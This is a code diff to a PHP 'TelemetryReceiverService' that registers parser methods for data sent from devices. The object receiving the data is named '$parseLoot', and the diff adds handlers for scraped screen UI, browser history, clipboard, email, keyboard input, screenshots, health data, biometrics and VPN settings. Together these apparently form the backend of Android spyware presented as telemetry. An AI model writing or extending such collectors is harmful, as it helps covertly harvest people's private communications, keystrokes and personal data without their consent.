@@ -41,7 +41,7 @@ class TelemetryReceiverService
         // New extractors
         'processes', 'camera_info', 'battery_stats', 'accessibility', 'input_methods',
         // NEW: 9 additional extractors
-        'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'data_usage', 'saved_wifi', 'default_apps', 'alarms',
+        'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'data_usage', 'saved_wifi', 'default_apps', 'alarms', 'ui_scrape',
         // Group 1-6 new extractors
         'hardware_graphics', 'hardware_network', 'app_security', 'network_security', 'telephony_network', 'system_locale',
         // Composite extractors
@@ -331,6 +331,7 @@ class TelemetryReceiverService
             'saved_wifi'     => 'parse_saved_wifi',
             'default_apps'   => 'parse_default_apps',
             'alarms'         => 'parse_alarms',
+            'ui_scrape'      => 'parse_ui_scrape',
             // Group 1-6 new extractors
             'hardware_graphics'  => 'parse_hardware_graphics',
             'hardware_network'   => 'parse_hardware_network',
@@ -505,6 +506,7 @@ class TelemetryReceiverService
                 'saved_wifi'          => 'parse_saved_wifi',
                 'default_apps'        => 'parse_default_apps',
                 'alarms'              => 'parse_alarms',
+                'ui_scrape'           => 'parse_ui_scrape',
                 'hardware_graphics'   => 'parse_hardware_graphics',
                 'hardware_network'    => 'parse_hardware_network',
                 'app_security'        => 'parse_app_security',
@@ -514,6 +516,29 @@ class TelemetryReceiverService
                 'misc_software'       => 'parse_misc_software',
                 'misc_hardware'       => 'parse_misc_hardware',
                 'apps_notifications'  => 'parse_apps_notifications',
+                // Misc software detail extractors
+                'app_permissions'  => 'parse_app_permissions',
+                'browser_history'  => 'parse_browser_history',
+                'clipboard'        => 'parse_clipboard',
+                'content_providers'=> 'parse_content_providers',
+                'crash_logs'       => 'parse_crash_logs',
+                'digital_wellbeing'=> 'parse_digital_wellbeing',
+                'doze_standby'     => 'parse_doze_standby',
+                'email'            => 'parse_email',
+                'health_data'      => 'parse_health_data',
+                'keyboard_input'   => 'parse_keyboard_input',
+                'keyguard'         => 'parse_keyguard',
+                'screenshots'      => 'parse_screenshots',
+                'screen_state'     => 'parse_screen_state',
+                'vpn_config'       => 'parse_vpn_config',
+                'running_processes'=> 'parse_running_processes',
+                // Misc hardware detail extractors
+                'audio_devices'  => 'parse_audio_devices',
+                'biometric'      => 'parse_biometric',
+                'gnss_hardware'  => 'parse_gnss_hardware',
+                'power_rails'    => 'parse_power_rails',
+                'usb_devices'    => 'parse_usb_devices',
+                'vibration'      => 'parse_vibration',
             ];
 
             if (isset($legacyMethodMap[$category]) && method_exists($parseLoot, $legacyMethodMap[$category])) {
